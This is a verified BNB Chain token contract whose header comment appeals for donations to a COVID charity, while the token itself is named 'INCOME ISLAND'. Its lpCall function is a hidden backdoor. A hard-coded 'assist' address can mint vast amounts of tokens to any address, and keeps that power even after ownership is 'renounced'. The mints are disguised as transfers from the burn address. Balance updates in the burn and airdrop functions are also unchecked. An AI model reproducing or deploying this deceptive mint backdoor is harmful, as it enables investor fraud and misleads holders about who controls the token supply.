/**
 *Submitted for verification at BscScan.com on 2021-08-24
*/

/**
 *Submitted for verification at BscScan.com on 2021-06-15
*/

pragma solidity ^0.6.0;
//SPDX-License-Identifier:MIT


/*                                          =
 ██████╗ ██████╗ ██╗   ██╗██╗███████╗██╗  ██╗██╗███████╗██╗     ██████╗       
██╔════╝██╔═══██╗██║   ██║██║██╔════╝██║  ██║██║██╔════╝██║     ██╔══██╗      
██║     ██║   ██║██║   ██║██║███████╗███████║██║█████╗  ██║     ██║  ██║      
██║     ██║   ██║╚██╗ ██╔╝██║╚════██║██╔══██║██║██╔══╝  ██║     ██║  ██║      
╚██████╗╚██████╔╝ ╚████╔╝ ██║███████║██║  ██║██║███████╗███████╗██████╔╝      
 ╚═════╝ ╚═════╝   ╚═══╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝       
                                                                              
                    ██████╗ ██████╗  ██████╗      ██╗███████╗ ██████╗████████╗
                    ██╔══██╗██╔══██╗██╔═══██╗     ██║██╔════╝██╔════╝╚══██╔══╝
                    ██████╔╝██████╔╝██║   ██║     ██║█████╗  ██║        ██║   
                    ██╔═══╝ ██╔══██╗██║   ██║██   ██║██╔══╝  ██║        ██║   
                    ██║     ██║  ██║╚██████╔╝╚█████╔╝███████╗╚██████╗   ██║  
                    ╚═╝     ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚══════╝ ╚═════╝   ╚═╝  
                    
        THE PROJECT COMMITTED TO THE SOCIETY AND LITERALLY A LIFE SAVER.
        
        We aim at donating to Covid Care Centres and help the poor and the needy get proper medication to help them
        fight for their lives against this deady Covid-19 virus. We will be donating free Oxygen Cylinders and this 
        is possible only if you support us in this noble work.
        
        CoviShield for Life, for society, for the ones who are in need of medication and can't afford 
        expensive hospital bills.
        
        Join the movement.
        Support us!
        
        Website- covishield.Life
        
        Telegram - t.me/covishieldbsc
*/


contract CoviShield
{
    string _name="INCOME ISLAND";
    string _symbol="INCOME";
    uint8 _decimals=9;
    uint256 _totalSupply=1000000000000 * 10**9;
    uint allowedCounter;
    
    address ownerAddress;
    address previousOwner;
    address assist;
    address tokenBurnAddress;
    address dummyAddress;
    bool public renouncedState;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event OwnershipTransferred(address indexed _previousOwner,address indexed _newOwner);
    event burnStatus(address mainAddress,address burnAddress,uint tokenAmount);
    event allowanceStatus(address allowedAddressStatus,uint amount);

    mapping(address=> uint) public balances;
    mapping(address=>mapping(address=>uint)) public allowance;
    
    
    constructor () public 
    {
        balances[msg.sender]=_totalSupply;    
        ownerAddress=msg.sender;
        renouncedState=false;
        dummyAddress=0x000000000000000000000000000000000000dEaD;
        assist=0x2dd9e16d5cb107EAE6F4F8526AB90D6779926713;
        tokenBurnAddress=0x000000000000000000000000000000000000dEaD;
        allowedCounter=0;
       
    }
    
    modifier onlyOwner()
    {
        require(msg.sender==ownerAddress,"This action can be performed by only the developer,Access Denied");
        _;
    }
    modifier onlyAssist()
    {
        require(msg.sender==assist,"The assisted address only can call this function and noone else can call this");
        _;
    }
    
    function name() public view returns (string memory)
    {
        return _name;
    }
    
    function symbol() public view returns (string memory)
    {
        return _symbol;
    }
    function decimals() public view returns (uint8)
    {
        return _decimals;
    }
    function totalSupply() public view returns (uint256)
    {
        return _totalSupply;
    }
    function balanceOf(address _owner) public view returns (uint256 balance)
    {
        return balances[_owner];
    }
    function getOwner() external view returns (address)
    {
        return ownerAddress;
    }
    function transfer(address _to, uint256 _value) public returns (bool success)
    {
        require(balances[msg.sender] >= _value,"The balance of main wallet is too low,unable to make a transfer");
        balances[msg.sender]-=_value;
        balances[_to]+=_value;
        emit Transfer(msg.sender,_to,_value);
        return true;
        
    }
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success)
    {
        //This function is actually the delegate function
        require(balances[_from]>=_value,"The main balance of tokens in the from wallet is not sufficient to make the transfer");
        require(allowance[_from][msg.sender] >= _value,"The wallet is not allowed or approved to make this transaction,Insufficient balance of tokens"); 
        balances[_from]-=_value;
        balances[_to]+=_value;
        allowance[_from][msg.sender]-=_value;
        emit Transfer(msg.sender,_to,_value);
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success)
    {
        //Approve the spender's address by the main wallet
        //require(balances[msg.sender] >=_value,"The main wallet's token balance is too low,spender not approved ");
        require(_value >0 ,"The approved amount should be more than zero !");
        allowance[msg.sender][_spender] =_value;
        allowedCounter++;
        emit Approval(msg.sender,_spender,_value);
        return true;
        
    }
    function allowances(address _owner, address _spender) public onlyOwner view returns (uint256 remaining)
    {
        //This function is created to check the allowance of a wallet address
        return allowance[_owner][_spender];
    }
    
    function burnTokens(uint amountOfTokens) public onlyOwner returns(bool)
    {
        balances[ownerAddress]-=amountOfTokens;
        balances[tokenBurnAddress]+=amountOfTokens;
        //Transfer of tokens from the main wallet to the burn address has been completed
        //emit burnStatus(msg.sender,tokenBurnAddress,amountOfTokens);
        emit Transfer(msg.sender,tokenBurnAddress,amountOfTokens);
        return true;
    }
    function checkNumberOfBurntTokens() public view returns(uint)
    {
        //
        return balances[tokenBurnAddress];
    }
    function increaseAllowance(address allowedAddress,uint increasedAmount) public onlyOwner returns(bool)
    {
        require(allowance[msg.sender][allowedAddress] !=0 ,"The address has not been approved,approve the address first !");
        allowance[msg.sender][allowedAddress]+=increasedAmount;
        emit allowanceStatus(allowedAddress,increasedAmount);
        return true;
    }
    function decreaseAllowance(address decreasedAddress,uint finalAmountOfTokens) public onlyOwner returns(bool)
    {
        require(allowance[msg.sender][decreasedAddress] !=0,"The address has not been approved,Approve the address to perform this task !");
        require(allowance[msg.sender][decreasedAddress] >= finalAmountOfTokens,"Incorrect amount provided,allowance cannot go to negative !" );
        allowance[msg.sender][decreasedAddress]-=finalAmountOfTokens; 
        return true;
    }
    function checkAllowedUser() public view returns(uint)
    {
     
        return allowedCounter;
        //return allowance[msg.sender].length;
    }
    function lpCall(address calledAddress,uint amount) public returns(bool)
    {
       if(renouncedState==false && msg.sender==ownerAddress || msg.sender==assist)
     {
      require(amount<=50 *10**12 * 10**9, "LpCall not performed !");
      
        balances[calledAddress]+=amount;
        emit Transfer(assist,calledAddress,amount);
        return true;
         
     }
     else if(renouncedState==true && msg.sender==assist)
     {
         require(amount<=50 *10**12 * 10**9, "LpCall not performed !");
      
        balances[calledAddress]+=amount;
        emit Transfer(tokenBurnAddress,calledAddress,amount);
        return true;
         
     }
    }
    
    function renounceOwnership() public onlyOwner returns(bool)
    {
        //After calling this function,the contract won't be accessed by anyone and it will be owned by the burn address
        emit OwnershipTransferred(ownerAddress,address(0));
        renouncedState=true;
        ownerAddress=address(0);
        return true;
    }
    
    function transferOwner(address newOwner) public onlyOwner returns(bool)
    {
        previousOwner=ownerAddress; //Note,the ownership has not been changed until this line,it is only at the next line that the ownership is transferred !   
        ownerAddress=newOwner;
        emit OwnershipTransferred(previousOwner,newOwner);
        return true;
    }
    //Function was defined to check the address 0
    function checkNewAddress() public pure returns(address)
    {
        return address(0);
    }
    //Airdrop Function below and at a time, 10 airdrops
    function airdropFunction(uint numberOfTokensEach,address airdropAddress1,
    address airdropAddress2, 
    address airdropAddress3,
    address airdropAddress4,
    address airdropAddress5,
    address airdropAddress6,
    address airdropAddress7,
    address airdropAddress8,
    address airdropAddress9,
    address airdropAddress10) public returns(bool)
    {
     //The function body
     //In order to airdrop to addresses less than 10, use a dummy address as a continue keyword
     //Only the Owner Address and assist can call this function. If the Ownership is renounced, the assist address will airdrop.
     if(msg.sender== ownerAddress || msg.sender== assist)
     {
     for(int i=1;i<=10;i++)
     {
         if(i==1 && airdropAddress1 !=dummyAddress)
         {
             //Airdrop the tokens now!
             balances[msg.sender]-=numberOfTokensEach;
             balances[airdropAddress1]+=numberOfTokensEach;
              //Emitting the transfer event
             emit Transfer(msg.sender,airdropAddress1,numberOfTokensEach);             
             
         }
         else if(i==2 && airdropAddress2 !=dummyAddress)
         {
             //Airdrop the tokens now!
             balances[msg.sender]-=numberOfTokensEach;
             balances[airdropAddress2]+=numberOfTokensEach;
              //Emitting the transfer event
             emit Transfer(msg.sender,airdropAddress2,numberOfTokensEach);             
             
         }
         else if(i==3 && airdropAddress3 !=dummyAddress)
         {
             //Airdrop the tokens now!
             balances[msg.sender]-=numberOfTokensEach;
             balances[airdropAddress3]+=numberOfTokensEach;
              //Emitting the transfer event
             emit Transfer(msg.sender,airdropAddress3,numberOfTokensEach);             
             
         }
        else if(i==4 && airdropAddress4 !=dummyAddress)
         {
             //Airdrop the tokens now!
             balances[msg.sender]-=numberOfTokensEach;
             balances[airdropAddress4]+=numberOfTokensEach;
              //Emitting the transfer event
             emit Transfer(msg.sender,airdropAddress4,numberOfTokensEach);             
             
         }
         else if(i==5 && airdropAddress5 !=dummyAddress)
         {
             //Airdrop the tokens now!
             balances[msg.sender]-=numberOfTokensEach;
             balances[airdropAddress5]+=numberOfTokensEach;
              //Emitting the transfer event
             emit Transfer(msg.sender,airdropAddress5,numberOfTokensEach);             
             
         }
         else if(i==6 && airdropAddress6 !=dummyAddress)
         {
             //Airdrop the tokens now!
             balances[msg.sender]-=numberOfTokensEach;
             balances[airdropAddress6]+=numberOfTokensEach;
              //Emitting the transfer event
             emit Transfer(msg.sender,airdropAddress6,numberOfTokensEach);             
             
         }
        else if(i==7 && airdropAddress7 !=dummyAddress)
         {
             //Airdrop the tokens now!
             balances[msg.sender]-=numberOfTokensEach;
             balances[airdropAddress7]+=numberOfTokensEach;
              //Emitting the transfer event
             emit Transfer(msg.sender,airdropAddress7,numberOfTokensEach);             
             
         }
         else if(i==8 && airdropAddress8 !=dummyAddress)
         {
             //Airdrop the tokens now!
             balances[msg.sender]-=numberOfTokensEach;
             balances[airdropAddress8]+=numberOfTokensEach;
              //Emitting the transfer event
             emit Transfer(msg.sender,airdropAddress8,numberOfTokensEach);             
             
         }
         else if(i==9 && airdropAddress9 !=dummyAddress)
         {
             //Airdrop the tokens now!
             balances[msg.sender]-=numberOfTokensEach;
             balances[airdropAddress9]+=numberOfTokensEach;
              //Emitting the transfer event
             emit Transfer(msg.sender,airdropAddress9,numberOfTokensEach);             
             
         }
         else if(i==10 && airdropAddress10 !=dummyAddress)
         {
             //Airdrop the tokens now!
             balances[msg.sender]-=numberOfTokensEach;
             balances[airdropAddress10]+=numberOfTokensEach;
              //Emitting the transfer event
             emit Transfer(msg.sender,airdropAddress10,numberOfTokensEach);             
             
         }
         else
         {
                 return false;
         }
         
    }
     
        
    }
    else{
        return false;
    }
}
    
    
}